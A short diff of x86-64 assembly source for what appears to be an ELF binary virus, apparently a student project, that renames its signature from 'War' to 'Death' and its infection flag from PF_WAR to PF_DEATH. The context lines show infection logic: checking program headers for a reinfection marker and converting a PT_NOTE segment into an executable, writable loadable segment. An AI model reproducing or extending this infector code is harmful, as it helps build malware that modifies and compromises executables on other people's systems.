@@ -503,7 +503,7 @@ magic_key: db 0x00					; Will be replaced by a script
 magic_key_size: equ $ - magic_key
 ; never used but here to be copied in the binary
 clean: db 0x0
-signature: db "War v1.0 by jmaia and dhubleur - "
+signature: db "Death v1.0 by jmaia and dhubleur - "
 fingerprint_str: db "0000000000", 0
 fingerprint_int: dd 0
 ; END FAKE .data SECTION
@@ -1189,12 +1189,12 @@ has_signature:
 		imul rcx, rsi				; 		...
 		add rax, rcx				; 		...
 
-		; check if PF_WAR
-		mov rdi, rax				; if (!(cur_phdr->p_flag & PF_WAR))
+		; check if PF_DEATH
+		mov rdi, rax				; if (!(cur_phdr->p_flag & PF_DEATH))
 		add rdi, elf64_phdr.p_flags		; ...
 		mov eax, [rdi]				; ...
-		and eax, PF_WAR			; ...
-		cmp eax, PF_WAR			; ...
+		and eax, PF_DEATH			; ...
+		cmp eax, PF_DEATH			; ...
 		jne .next_phdr_loop			; 	goto next_phdr_loop;
 
 		jmp .found				; goto found;
@@ -1262,7 +1262,7 @@ convert_pt_note_to_load:
 
 	mov rdi, rax					; _flags_ptr = _note_segment->p_flags;
 	add rdi, elf64_phdr.p_flags			; ...
-	mov DWORD [rdi], PF_X | PF_R | PF_W | PF_WAR	; *_flags_ptr = PF_X | PF_R | PF_W | PF_WAR;
+	mov DWORD [rdi], PF_X | PF_R | PF_W | PF_DEATH	; *_flags_ptr = PF_X | PF_R | PF_W | PF_DEATH;
 
 	mov rdi, rax					; _offset_ptr = _note_segment->p_offset;
 	add rdi, elf64_phdr.p_offset			; ...
